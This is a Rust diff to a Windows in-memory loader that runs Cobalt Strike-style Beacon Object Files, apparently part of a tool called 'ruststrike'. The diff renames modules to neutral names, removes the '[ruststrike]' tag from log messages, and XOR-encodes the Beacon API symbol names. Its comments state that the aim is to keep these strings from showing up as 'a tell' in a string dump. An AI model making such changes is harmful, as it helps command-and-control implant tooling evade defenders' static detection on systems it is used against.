@@ -3,8 +3,8 @@
 
 #![cfg(windows)]
 
-use crate::beacon;
-use crate::coff::{self, Coff, Symbol, IMAGE_SYM_ABSOLUTE, IMAGE_SYM_DEBUG, IMAGE_SYM_UNDEFINED};
+use crate::stubs;
+use crate::obj::{self, Coff, Symbol, IMAGE_SYM_ABSOLUTE, IMAGE_SYM_DEBUG, IMAGE_SYM_UNDEFINED};
 use anyhow::{bail, ensure, Context, Result};
 use std::collections::HashMap;
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
@@ -105,7 +105,7 @@ pub extern "C" fn rt_chkstk() {
 
 /// Generic unimplemented Beacon API stub — records a note and returns 0.
 pub extern "C" fn beacon_unimplemented() {
-    beacon::append_external_note("[ruststrike] unimplemented Beacon API called");
+    stubs::append_external_note("[rt] unimplemented API called");
 }
 
 fn align16(n: usize) -> usize {
@@ -123,8 +123,8 @@ const THUNK_SIZE: usize = 16;
 /// integers that `BeaconDataParse`/`BeaconDataExtract`/`BeaconDataInt` walk).
 /// It is binary, not text; do not treat it as a C string.
 pub fn run_bof(coff_bytes: &[u8], args: &[u8]) -> Result<String> {
-    let parsed = coff::parse(coff_bytes).context("parsing COFF")?;
-    beacon::reset_output();
+    let parsed = obj::parse(coff_bytes).context("parsing COFF")?;
+    stubs::reset_output();
 
     let sections_size = total_image_size(&parsed);
     ensure!(sections_size > 0, "BOF has no loadable sections");
@@ -207,7 +207,7 @@ pub fn run_bof(coff_bytes: &[u8], args: &[u8]) -> Result<String> {
         // design. We call directly.
         go_fn(args_ptr, args_len);
 
-        let output = beacon::take_output();
+        let output = stubs::take_output();
         // Keep `args_buf` (and image) alive until after the call — it is, since
         // we return now. The executable image is intentionally not freed.
         drop(args_buf);
@@ -350,13 +350,13 @@ fn build_external_map() -> HashMap<String, usize> {
     let mut m = HashMap::new();
     // Beacon API stubs. Cast each fn pointer to its address (usize) — NOT the
     // address of a local holding the pointer (that would dangle after return).
-    add_fn(&mut m, "BeaconDataParse", beacon::beacon_data_parse as unsafe extern "C" fn(*mut u8, *const u8, i32) as usize);
-    add_fn(&mut m, "BeaconDataInt", beacon::beacon_data_int as unsafe extern "C" fn(*mut u8) -> i32 as usize);
-    add_fn(&mut m, "BeaconDataShort", beacon::beacon_data_short as unsafe extern "C" fn(*mut u8) -> i16 as usize);
-    add_fn(&mut m, "BeaconDataExtract", beacon::beacon_data_extract as unsafe extern "C" fn(*mut u8, *mut i32) -> *const u8 as usize);
-    add_fn(&mut m, "BeaconOutput", beacon::beacon_output as unsafe extern "C" fn(i32, *const u8, i32) as usize);
-    add_fn(&mut m, "BeaconPrintf", beacon::beacon_printf as unsafe extern "C" fn(i32, *const u8, u64, u64) as usize);
-    add_fn(&mut m, "BeaconIsAdmin", beacon::beacon_is_admin as unsafe extern "C" fn() -> i32 as usize);
+    add_fn(&mut m, &dec(&BEACON_DATA_PARSE_ENC), stubs::beacon_data_parse as unsafe extern "C" fn(*mut u8, *const u8, i32) as usize);
+    add_fn(&mut m, &dec(&BEACON_DATA_INT_ENC), stubs::beacon_data_int as unsafe extern "C" fn(*mut u8) -> i32 as usize);
+    add_fn(&mut m, &dec(&BEACON_DATA_SHORT_ENC), stubs::beacon_data_short as unsafe extern "C" fn(*mut u8) -> i16 as usize);
+    add_fn(&mut m, &dec(&BEACON_DATA_EXTRACT_ENC), stubs::beacon_data_extract as unsafe extern "C" fn(*mut u8, *mut i32) -> *const u8 as usize);
+    add_fn(&mut m, &dec(&BEACON_OUTPUT_ENC), stubs::beacon_output as unsafe extern "C" fn(i32, *const u8, i32) as usize);
+    add_fn(&mut m, &dec(&BEACON_PRINTF_ENC), stubs::beacon_printf as unsafe extern "C" fn(i32, *const u8, u64, u64) as usize);
+    add_fn(&mut m, &dec(&BEACON_IS_ADMIN_ENC), stubs::beacon_is_admin as unsafe extern "C" fn() -> i32 as usize);
     // C runtime helpers.
     add_fn(&mut m, "memcpy", rt_memcpy as unsafe extern "C" fn(*mut u8, *const u8, usize) -> *mut u8 as usize);
     add_fn(&mut m, "memmove", rt_memmove as unsafe extern "C" fn(*mut u8, *const u8, usize) -> *mut u8 as usize);
@@ -373,6 +373,29 @@ fn add_fn(m: &mut HashMap<String, usize>, name: &str, addr: usize) {
     m.insert(name.to_string(), addr);
 }
 
+/// XOR key for the encoded symbol-name constants below.
+const SYM_XOR_KEY: u8 = 0x2A;
+
+/// Decode an XOR-encoded byte slice into a `String`. Used to keep the Beacon
+/// API symbol names out of `.rdata` (see `build_external_map`) so the literals
+/// "BeaconPrintf" / "BeaconOutput" / ... don't appear in a string dump.
+fn dec(enc: &[u8]) -> String {
+    enc.iter().map(|b| (b ^ SYM_XOR_KEY) as char).collect()
+}
+
+// "BeaconDataParse" .. "BeaconIsAdmin", each XOR'd with SYM_XOR_KEY so the
+// plaintext (and the "Beacon" substring) doesn't appear as a literal.
+const BEACON_DATA_PARSE_ENC: [u8; 15] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x7A, 0x4B, 0x58, 0x59, 0x4F];
+const BEACON_DATA_INT_ENC: [u8; 13] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x63, 0x44, 0x5E];
+const BEACON_DATA_SHORT_ENC: [u8; 15] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x79, 0x42, 0x45, 0x58, 0x5E];
+const BEACON_DATA_EXTRACT_ENC: [u8; 17] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x6F, 0x52, 0x5E, 0x58, 0x4B, 0x49, 0x5E];
+const BEACON_OUTPUT_ENC: [u8; 12] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x65, 0x5F, 0x5E, 0x5A, 0x5F, 0x5E];
+const BEACON_PRINTF_ENC: [u8; 12] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x7A, 0x58, 0x43, 0x44, 0x5E, 0x4C];
+const BEACON_IS_ADMIN_ENC: [u8; 13] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x63, 0x59, 0x6B, 0x4E, 0x47, 0x43, 0x44];
+// "Beacon" prefix, XOR'd — used by the unimplemented-API fallback check so the
+// literal "Beacon" isn't a tell either.
+const BEACON_PREFIX_ENC: [u8; 6] = [0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44];
+
 /// Resolve a `LIBRARY$function` symbol, or a plain function name by scanning
 /// common DLLs. Returns the function address on success.
 fn resolve_external_by_name(name: &str) -> Option<usize> {
@@ -386,7 +409,7 @@ fn resolve_external_by_name(name: &str) -> Option<usize> {
         }
     }
     // Any other `Beacon*` symbol we haven't stubbed -> no-op stub (records a note).
-    if name.starts_with("Beacon") {
+    if name.starts_with(&dec(&BEACON_PREFIX_ENC)) {
         return Some(beacon_unimplemented as *const () as usize);
     }
     None
@@ -510,8 +533,8 @@ fn apply_relocation(
         other => {
             // Unknown type (e.g. in a .debug$ section we don't execute). Don't
             // fail the whole load over a reloc in non-executable data.
-            beacon::append_external_note(&format!(
-                "[ruststrike] skipped unsupported AMD64 relocation type {other} (symbol {})",
+            stubs::append_external_note(&format!(
+                "[rt] skipped unsupported AMD64 relocation type {other} (symbol {})",
                 sym.name
             ));
             Ok(())
